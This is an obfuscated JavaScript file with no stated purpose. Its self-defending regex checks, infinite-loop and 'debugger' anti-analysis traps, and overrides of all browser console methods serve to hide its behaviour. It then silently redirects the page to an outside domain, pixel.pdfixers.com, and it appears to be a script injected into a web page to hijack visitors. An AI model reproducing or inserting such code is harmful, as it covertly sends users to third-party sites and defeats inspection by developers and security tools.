;(function () {
  var f = (function () {
      var w = true
      return function (R, z) {
        var o = w
          ? function () {
              if (z) {
                var P = z.apply(R, arguments)
                return (z = null), P
              }
            }
          : function () {}
        return (w = false), o
      }
    })(),
    Q = f(this, function () {
      return Q.toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(Q)
        .search('(((.+)+)+)+$')
    })
  Q()
  var A = (function () {
    var w = true
    return function (R, z) {
      var o = w
        ? function () {
            if (z) {
              var P = z.apply(R, arguments)
              return (z = null), P
            }
          }
        : function () {}
      return (w = false), o
    }
  })()
  ;(function () {
    A(this, function () {
      var R = new RegExp('function *\\( *\\)'),
        z = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        o = g('init')
      !R.test(o + 'chain') || !z.test(o + 'input') ? o('0') : g()
    })()
  })()
  var u = (function () {
      var w = true
      return function (R, z) {
        var E = w
          ? function () {
              if (z) {
                var y = z.apply(R, arguments)
                return (z = null), y
              }
            }
          : function () {}
        return (w = false), E
      }
    })(),
    C = u(this, function () {
      var w
      try {
        var R = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        w = R()
      } catch (L) {
        w = window
      }
      var z = (w.console = w.console || {}),
        o = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
      for (var P = 0; P < o.length; P++) {
        var G = u.constructor.prototype.bind(u)
        var Y = o[P]
        var H = z[Y] || G
        G['__proto__'] = u.bind(u)
        G.toString = H.toString.bind(H)
        z[Y] = G
      }
    })
  C()
  try {
    location.href = 'https://pixel.pdfixers.com'
  } catch (w) {}
})()
function g(B) {
  function I(j) {
    if (typeof j === 'string') {
      return function (f) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + j / j).length !== 1 || j % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    I(++j)
  }
  try {
    if (B) {
      return I
    } else {
      I(0)
    }
  } catch (j) {}
}
